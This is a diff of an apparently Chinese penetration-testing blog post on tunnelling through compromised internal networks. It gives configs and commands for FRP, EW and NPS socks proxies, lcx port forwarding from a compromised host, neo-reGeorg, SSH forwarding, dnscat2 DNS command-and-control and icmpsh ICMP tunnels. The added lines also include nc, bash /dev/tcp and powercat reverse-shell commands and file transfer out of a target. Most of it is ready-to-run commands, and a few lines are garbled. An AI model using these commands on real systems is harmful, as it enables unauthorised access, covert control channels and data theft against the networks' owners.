-<h2 id="frp">FRP</h2>
-<h3 id="一正向代理">一、正向代理</h3>
-<h4 id="1在客户端配置">1.在客户端配置</h4>
-<pre><code>[common]
-bind_addr = 0.0.0.0
-bind_port = 7000
-token = 123456
-</code></pre>
-<p>配置好之后运行<code>frps.exe -c frps.ini</code></p>
-<h4 id="2在vps中配置">2.在vps中配置</h4>
-<p>frpc.ini</p>
-<pre><code>[common]
-# 填写客户端的
-server_addr = 10.108.3.58
-server_port = 7000
-token = 123456
-
-[plugin_http_proxy]
-type = tcp
-remote_port = 7890
-plugin = http_proxy
-# 可以添加认证
-# plugin_http_user = abc
-# plugin_http_passwd = abc
-
-[plugin_socks5]
-type = tcp
-remote_port = 7891
-plugin = socks5
-# plugin_user = abc
-# plugin_passwd = abc
-</code></pre>
-<p>配置好之后运行<code>frpc.exe -c frpc.ini</code></p>
-<h3 id="二反向代理">二、反向代理</h3>
+<h1 id="0x04-各种协议隧道">0x04 各种协议隧道</h1>
+<h2 id="一socks代理">一、Socks代理</h2>
+<h3 id="1-frp隧道">1. FRP隧道</h3>
+<h4 id="11-反向代理">1.1. 反向代理</h4>
 <p>目的：</p>
 <pre><code>1.需要通过公网服务器代理连接内网机器
 2.需要通过代理使得本机外网地址变为该内网机器外网IP
 </code></pre>
 <p>拓扑图</p>
 <p><img src="./images/20210721004100751_19779.png" alt=""></p>
-<h4 id="1首先在公网上配置服务端frpsini">1、首先在公网上配置服务端(frps.ini)</h4>
+<h5 id="1配置靶机上配置frps-ini">1、配置靶机上配置frps. ini</h5>
 <p>#frps.ini</p>
 <pre><code>[common]
 bind_addr = 0.0.0.0
 bind_port = 7000
-token = 123456
 </code></pre>
-<p><img src="./images/20210721001549988_3587.png" alt=""></p>
-<p>配置好之后运行<code>frps.exe -c frps.ini</code></p>
-<p><img src="./images/20210721001950216_9760.png" alt=""></p>
-<h4 id="2配置客户端frpc-ini">2、配置客户端frpc. ini</h4>
+<h5 id="2首先在公网上配置服务端frpcini">2、首先在公网上配置服务端(frpc.ini)</h5>
 <p>#frpc.ini</p>
 <pre><code>[common]
 # 填写攻击机的地址
-server_addr = 10.108.3.58
+server_addr = 0.0.0.0
 server_port = 7000
-token = 123456
+
 
 [plugin_http_proxy]
 type = tcp
@@ -527,10 +696,7 @@ plugin = socks5
 # plugin_user = abc
 # plugin_passwd = abc
 </code></pre>
-<p><img src="./images/20210721001747762_4611.png" alt="">
-配置好之后运行<code>frpc.exe -c frpc.ini</code></p>
-<p><img src="./images/20210721002006114_19060.png" alt=""></p>
-<h4 id="3配置proxifier">3、配置proxifier</h4>
+<h5 id="3配置proxifier">3、配置proxifier</h5>
 <p><img src="./images/20210721002033198_9344.png" alt=""></p>
 <p>配置ip、端口、连接方式、账号密码</p>
 <p><img src="./images/20210721002404375_7966.png" alt=""></p>
@@ -541,11 +707,11 @@ Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP�
 <p><img src="./images/20210721002944989_28306.png" alt=""></p>
 <p>尝试访问内网地址</p>
 <p><img src="./images/20210721003019909_30798.png" alt=""></p>
-<h3 id="三多层socks代理">三多层socks代理</h3>
+<h4 id="12多层socks代理">1.2.多层socks代理</h4>
 <p>实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中</p>
 <p><img src="./images/image-20210725004808097.png" alt="image-20210725004808097"></p>
 <p>具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)</p>
-<h4 id="1vps配置frpsini">1、VPS配置frps.ini</h4>
+<h5 id="1vps配置frpsini">1、VPS配置frps.ini</h5>
 <p>#frps.ini</p>
 <pre><code>[common]
 bind_addr = 0.0.0.0
@@ -555,7 +721,7 @@ bind_port = 7000
 <pre><code>frps.exe -c frps.ini
 </code></pre>
 <p><img src="./images/image-20210725005010820.png" alt="image-20210725005010820"></p>
-<h4 id="2内网b主机的frpsini设置">2、内网B主机的frps.ini设置：</h4>
+<h5 id="2内网b主机的frpsini设置">2、内网B主机的frps.ini设置：</h5>
 <pre><code>[common]
 #填写ip当前主机的ip地址
 bind_addr = 192.168.100.40
@@ -564,7 +730,7 @@ bind_port = 7000
 <p>配置好之后运行</p>
 <pre><code>frpc.exe -c frpc.ini
 </code></pre>
-<h4 id="3内网c主机的frpcini设置">3、内网C主机的frpc.ini设置</h4>
+<h5 id="3内网c主机的frpcini设置">3、内网C主机的frpc.ini设置</h5>
 <p>frpc.ini</p>
 <pre><code>[common]
 #填写跳板的地址，这里填写的是主机website主机的iP地址
@@ -580,7 +746,7 @@ plugin = socks5
 <p>配置好之后运行</p>
 <pre><code>frpc.exe -c frpc.ini
 </code></pre>
-<h4 id="4内网b主机的frpcini设置">4、内网B主机的frpc.ini设置：</h4>
+<h5 id="4内网b主机的frpcini设置">4、内网B主机的frpc.ini设置：</h5>
 <p>#frpc.ini</p>
 <pre><code>[common]
 # 填写自己的服务器IP
@@ -599,14 +765,26 @@ local_port = 7777
 </code></pre>
 <p>思路分析：</p>
 <p>两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理</p>
-<h4 id="5测试socks代理是否搭建成功">5、测试socks代理是否搭建成功：</h4>
+<h5 id="5测试socks代理是否搭建成功">5、测试socks代理是否搭建成功：</h5>
 <p>访问主机B的web服务(192.168.1.50)</p>
 <p><img src="images/image-20210725011317773.png" alt="image-20210725011317773"></p>
 <p>访问主机C的web服务(192.168.2.200)</p>
 <p><img src="images/image-20210725011338666.png" alt="image-20210725011338666"></p>
 <p>说明代理没问题</p>
-<h2 id="ew">EW</h2>
-<h3 id="一反向代理">一、反向代理</h3>
+<h3 id="2ew">2.EW</h3>
+<h4 id="常用参数">常用参数</h4>
+<p>-l 指定要监听的本地<a href="https://so.csdn.net/so/search?q=%E7%AB%AF%E5%8F%A3&amp;spm=1001.2101.3001.7020">端口</a>
+-d 指定要反弹到的机器 ip
+-e 指定要反弹到的机器端口
+-f 指定要主动连接的机器 ip
+-g 指定要主动连接的机器端口
+-t 指定<a href="https://so.csdn.net/so/search?q=%E8%B6%85%E6%97%B6&amp;spm=1001.2101.3001.7020">超时</a>时长,默认为 1000</p>
+<h4 id="21--正向代理">2.1  正向代理</h4>
+<p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p>
+<pre><code>ew -s ssocksd -l 10899
+</code></pre>
+<p>使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可</p>
+<h4 id="22反向代理">2.2、反向代理</h4>
 <p>攻击机：</p>
 <pre><code>ew -s rcsocks -l 1081 -e 1080
 
@@ -615,7 +793,7 @@ local_port = 7777
 <p>靶机</p>
 <pre><code>ew -s rssocks -d 攻击机IP -e 1080
 </code></pre>
-<h3 id="二多层代理">二、多层代理</h3>
+<h4 id="23多层代理">2.3、多层代理</h4>
 <pre><code>获得目标网络内两台主机 A、B 的权限，情况描述如下：
 
 A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
@@ -641,7 +819,104 @@ A 主机可直连 B 主机
 <p><img src="images/image-20210725015759070.png" alt="image-20210725015759070"></p>
 <p>验证</p>
 <p><img src="images/image-20210725015620571.png" alt="image-20210725015620571"></p>
-<h2 id="lcx端口转发">lcx端口转发</h2>
+<h3 id="3nps">3.NPS</h3>
+<p>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
+<h4 id="31-反向代理">3.1 反向代理</h4>
+<h5 id="配置nps">配置nps</h5>
+<p>在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改<code>conf/nps.conf</code>即可：</p>
+<p>需要改一下<code>#web</code>下面的几个参数，</p>
+<pre><code>web_host= 服务器IP或者域名
+web_username= admin（登录用户名）
+web_password= 你的密码
+web_port=8080（web管理端口）
+</code></pre>
+<p><img src="images/image-20210904145052705.png" alt="image-20210904145052705"></p>
+<p>修改<code>#bridge</code> 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。</p>
+<pre><code>##bridge
+bridge_type=tcp
+bridge_port=443    # 修改连接端口
+bridge_ip=0.0.0.0
+</code></pre>
+<h5 id="启动server">启动server</h5>
+<p><img src="images/image-20210904145226109.png" alt="image-20210904145226109"></p>
+<p>访问WEB管理页面（默认web界面端口是8080，默认密码为admin/123 ，可以在配置文件里修改默认端口和账号密码）</p>
+<p><img src="images/image-20210904145523028.png" alt="image-20210904145523028"></p>
+<h5 id="新增客户端">新增客户端</h5>
+<p><img src="images/image-20210904145535674.png" alt="image-20210904145535674"></p>
+<p>设置客户端验证秘钥：</p>
+<p><img src="images/image-20210904145601248.png" alt="image-20210904145601248"></p>
+<p><img src="images/image-20210904145643688.png" alt="image-20210904145643688"></p>
+<h5 id="配置客户端">配置客户端</h5>
+<p>上传客户端文件至C，解压后在CMD运行命令：</p>
+<pre><code>npc.exe -server=10.108.3.147:8024 -vkey=123456 -type=tcp
+</code></pre>
+<p><img src="images/image-20210904145706521.png" alt="image-20210904145706521"></p>
+<p>在web管理页面可以看到C主机已上线：</p>
+<p><img src="images/image-20210904145721960.png" alt="image-20210904145721960"></p>
+<h5 id="配置socks5代理">配置Socks5代理</h5>
+<p>现在A仍然无法访问内网的C主机，需要使用Socks5客户端软件把流量带出来。</p>
+<p>注意：一定要等客户端上线以后在配置Socks代理。</p>
+<p><img src="images/image-20210904145811118.png" alt="image-20210904145811118"></p>
+<p><img src="images/image-20210904145838461.png" alt="image-20210904145838461"></p>
+<p>新增成功后的页面：</p>
+<p><img src="images/image-20210904145847358.png" alt="image-20210904145847358"></p>
+<h5 id="测试">测试</h5>
+<p>配置Proxifier</p>
+<p><img src="images/image-20210904150144696.png" alt="image-20210904150144696"></p>
+<p>测试成功</p>
+<p><img src="images/image-20210904150124741.png" alt="image-20210904150124741"></p>
+<p>官方文档：https://ehang-io.github.io/nps/#/?id=nps</p>
+<h2 id="二传输层">二、传输层</h2>
+<h3 id="21-nc">2.1. nc</h3>
+<p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p>
+<p>简单互相传输功能：</p>
+<pre><code>vps：nc -lp 5555 
+
+目标机器：Nc -vn vpsip 5555
+</code></pre>
+<p>文件传输功能：</p>
+<pre><code>vps：nc -lp 5555 &gt;1.txt
+
+目标机器：Nc -vn vpsip &lt; xx.txt
+</code></pre>
+<p>shell的反弹：</p>
+<pre><code>正向连接：
+nc -lvp 4444 -e /bin/sh
+nc  192.168.1.1 4444
+
+
+反向连接：
+nc -lvp 4444
+nc 192.168.1.1 4444 -e /bin/sh
+</code></pre>
+<p>注意：windows版本CMD位置C:\windows\system32\cmd.exe</p>
+<p>Bash反向shell</p>
+<pre><code>nc -lvp 4444
+
+Bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1
+</code></pre>
+<h3 id="22-powercatpowershell版的nc">2.2 Powercat（powershell版的nc）</h3>
+<pre><code>正向和反向连接：
+
+powercat -l -p 8080 -e cmd.exe  -v   
+nc 192.168.1.1 8080 -vv
+
+nc -l -p 8080 -vv
+powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v
+</code></pre>
+<p>可以反弹powershell</p>
+<pre><code>-eq 
+</code></pre>
+<p><strong>文件上传</strong></p>
+<p>这个不用说，基本这种连接的都支持</p>
+<p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p>
+<p>在有<code>text.txt</code>的机器执行:</p>
+<pre><code>powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v
+</code></pre>
+<p>另一台机器执行</p>
+<pre><code>powercat -l -p 9999 -of c:test.txt -v
+</code></pre>
+<h3 id="3lcx端口转发">3.lcx端口转发</h3>
 <pre><code>windows
 vps: lcx -listen 2222 3333    //2222为转发端口，3333为本机任意未被占用的端口
 肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389  //将本地3389端口转发至vps_ip 2222端口
@@ -654,10 +929,7 @@ vps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777
 肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666
 将内网主机22端口的流量转发到公网主机的6666端口
 </code></pre>
-<h2 id="nps">nps</h2>
-<p>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
-<p>待写</p>
-<h2 id="neo-regeorg">neo-reGeorg</h2>
+<h3 id="5neo-regeorg">5.neo-reGeorg</h3>
 <p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p>
 <pre><code>python neoreg.py generate -k &lt;you_password&gt; --file 404.html
 </code></pre>
@@ -666,23 +938,13 @@ vps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777
 <pre><code>python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5://10.1.1.1:8080（本地代理地址）
 </code></pre>
 <p>Socks连接工具连接本地127.0.0.1:1080</p>
-<h2 id="powercatpowershell版的nc">Powercat（powershell版的nc）</h2>
-<pre><code>正向和反向连接：
-
-powercat -l -p 8080 -e cmd.exe  -v   
-nc 192.168.1.1 8080 -vv
-
-nc -l -p 8080 -vv
-powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v
-</code></pre>
-<h1 id="应用层">应用层</h1>
-<h2 id="ssh转发">SSH转发：</h2>
+<h2 id="三应用层">三、应用层</h2>
+<h3 id="31-ssh转发">3.1 SSH转发</h3>
 <p>一个正常的SSH命令</p>
 <pre><code> ssh root@192.168.1.1
 </code></pre>
-<h2 id="ssh-本地转发机制">SSH 本地转发机制：</h2>
-<p>拓扑：</p>
-<p>VPS&mdash;-边界WEB&mdash;-目标主机</p>
+<h4 id="ssh-本地转发机制">SSH 本地转发机制</h4>
+<p>拓扑：VPS&mdash;-边界WEB&mdash;-目标主机</p>
 <p>边界WEB双网卡192.168.1.1和10.1.1.1段</p>
 <p>本地转发机制：</p>
 <p>选项：</p>
@@ -701,9 +963,8 @@ ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1
 netstat -tulnp | grep &quot;5555&quot;
 </code></pre>
 <p>当访问 VPS 5555 端口的时候，就转发给 <a href="mailto:root@192.168.1.1">root@192.168.1.1</a> 边界机 ，发送给目标主机</p>
-<h2 id="ssh-远程转发机制">SSH 远程转发机制：</h2>
-<p>拓扑：</p>
-<p>VPS&mdash;-边界WEB&mdash;-目标主机</p>
+<h4 id="ssh-远程转发机制">SSH 远程转发机制</h4>
+<p>拓扑：VPS&mdash;-边界WEB&mdash;-目标主机</p>
 <p>边界WEB&mdash;-目标主机&mdash;都是单网卡，都是纯内网 10.1.1.1段</p>
 <p><strong>在WEB边界机运行</strong></p>
 <pre><code>ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;
@@ -711,14 +972,14 @@ netstat -tulnp | grep &quot;5555&quot;
 ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102
 </code></pre>
 <p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p>
-<h2 id="ssh-动态转发机制">SSH 动态转发机制：</h2>
+<h4 id="ssh-动态转发机制">SSH 动态转发机制</h4>
 <p>这里主要是建立一个动态的socks代理隧道</p>
 <p>在VPS上运行</p>
 <pre><code>ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;
 ssh -CfNg -D 7000 root@192.168.1.1
 </code></pre>
 <p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p>
-<h2 id="dns-隧道">DNS 隧道：</h2>
+<h3 id="32-dns-隧道">3.2 DNS 隧道：</h3>
 <p>dnscat2</p>
 <p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p>
 <p>dnscat2分为两个部分：客户端和服务器。</p>
@@ -749,8 +1010,44 @@ ruby ./dnscat2
 客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）
 ./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5
 </code></pre>
-<p>参考：</p>
-<p><a href="https://buaq.net/go-26843.html">https://buaq.net/go-26843.html</a></p>
+<h2 id="四网络层">四、网络层</h2>
+<h3 id="41-icmp隧道">4.1 ICMP隧道</h3>
+<p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p>
+<p>icmp隧道常用攻击：icmpsh、PRISM</p>
+<p>icmpsh
+环境说明:跨平台、不需要管理员运行</p>
+<p>有三台机器： VPS&ndash;边界机&ndash;内网机</p>
+<p>VPS操作过程：</p>
+<p>下载icmpsh</p>
+<p>安装依赖</p>
+<pre><code>服务端禁用：
+icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all=1
+
+运行程序 ：
+./run.sh
+
+输入目标主机IP地址 开启监听：
+./icmpsh_m,py  vpsip 边界出网的公网IP
+
+
+在边界机执行：
+Imp.exe -t 攻击机ip -d 500 -b 30 -s 128
+</code></pre>
+<p>还有一种方法</p>
+<pre><code>编译 gcc icmpsh-m.c
+
+VPS开启监听： sudo ./a.out
+内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128
+</code></pre>
+<h3 id="42-lcx">4.2 Lcx</h3>
+<p>内网端口转发</p>
+<pre><code>目标主机：lcx.exe -slave vpsip 4444 127.0.0.1 3389
+
+VPS:Lcx --listen 4444 5555
+</code></pre>
+<h2 id="参考地址">参考地址</h2>
+<pre><code>https://xz.aliyun.com/t/7701#toc-0
+</code></pre>
 
     </div>
     <div class="article-footer">
@@ -789,7 +1086,7 @@ ruby ./dnscat2
     <div class="bar-inner">
         <ul class="pager pull-left">
             <li class="prev">
-                <a href="https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/" title="MSSQL获取shell和提权"><i
+                <a href="https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2021-36934 漏洞复现"><i
                         class="icon icon-angle-left"
                         aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
             </li>
@@ -820,7 +1117,7 @@ ruby ./dnscat2
 </main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
   <div class="copyright">
     &copy;2020  -
-    2021
+    2022
 
     
   </div>
@@ -885,6 +1182,17 @@ ruby ./dnscat2
     });
 </script>
 
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-289626488-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
 
   </body>
 </html>
